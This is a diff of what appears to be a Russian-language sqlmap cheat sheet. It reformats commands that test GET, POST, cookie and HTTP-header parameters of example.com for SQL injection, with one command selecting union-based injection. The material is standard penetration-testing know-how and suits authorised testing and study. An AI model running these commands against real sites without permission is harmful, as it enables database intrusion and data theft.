@@ -16,24 +16,29 @@
 
 
 
-
-
-
-
-
-
-
 GET-параметры
-sqlmap -u "http://example.com/index.php?id=1"
+> ```bash
+> sqlmap -u "http://example.com/index.php?id=1"
 
 POST-параметры
-sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"
+> ```bash
+> sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"
 
 Cookie-параметры
-sqlmap -u "http://example.com/profile.php" --cookie="PHPSESSID=abcd1234"
+> ```bash
+> sqlmap -u "http://example.com/profile.php" --cookie="PHPSESSID=abcd1234"
 
 HTTP-заголовки (User-Agent, Referer, X-Forwarded-For и т. д.)
-sqlmap -u "http://example.com/" --headers="User-Agent: evil_payload"
+> ```bash
+> sqlmap -u "http://example.com/" --headers="User-Agent: evil_payload"
+
+
+
+
+
+
+
+
 
 Определение типа инъекции
 sqlmap -u "http://example.com/index.php?id=1" --technique=U
